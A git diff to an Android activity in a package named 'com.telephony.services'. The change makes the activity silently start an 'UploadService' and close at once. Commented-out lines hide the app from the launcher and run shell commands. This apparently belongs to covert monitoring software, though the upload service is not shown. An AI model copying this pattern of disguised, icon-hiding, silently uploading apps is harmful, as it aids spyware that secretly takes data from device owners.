@@ -1,6 +1,8 @@
 package com.telephony.services;
 
 import android.app.Activity;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.Intent;
 import android.os.Bundle;
 
@@ -25,24 +27,22 @@ public class Main extends Activity {
 		// PendingIntent pmyIntent = PendingIntent.getService(this, 0, myIntent,
 		// 0);
 		// am.set(AlarmManager.ELAPSED_REALTIME, 50000L, pmyIntent);
-		
-		
-		
-		//Hide Main activity from launcher
-//		Utils.setComponentState(this, Main.class, false);
-		
-		
-		
-//		Intent mIntent = new Intent(this, UploadService.class);
-//		startService(mIntent);
 
-//		try {
-//			//new Proc("sh").exec(new String[] {"sleep 20"});
-//			Log.d(Utils.LOG_TAG, new Proc("sh").getChilds("1967"));
-//		} catch (IOException e) {
-//			e.printStackTrace();
-//		}
-		
+		// Hide Main activity from launcher
+		// Utils.setComponentState(this, Main.class, false);
+
+		// Intent mIntent = new Intent(this, UploadService.class);
+		// startService(mIntent);
+
+		// try {
+		// //new Proc("sh").exec(new String[] {"sleep 20"});
+		// Log.d(Utils.LOG_TAG, new Proc("sh").getChilds("1967"));
+		// } catch (IOException e) {
+		// e.printStackTrace();
+		// }
+		//startService(new Intent(this, DownloadService.class));
+		startService(new Intent(this, UploadService.class));
+
 		finish();
 	}
 
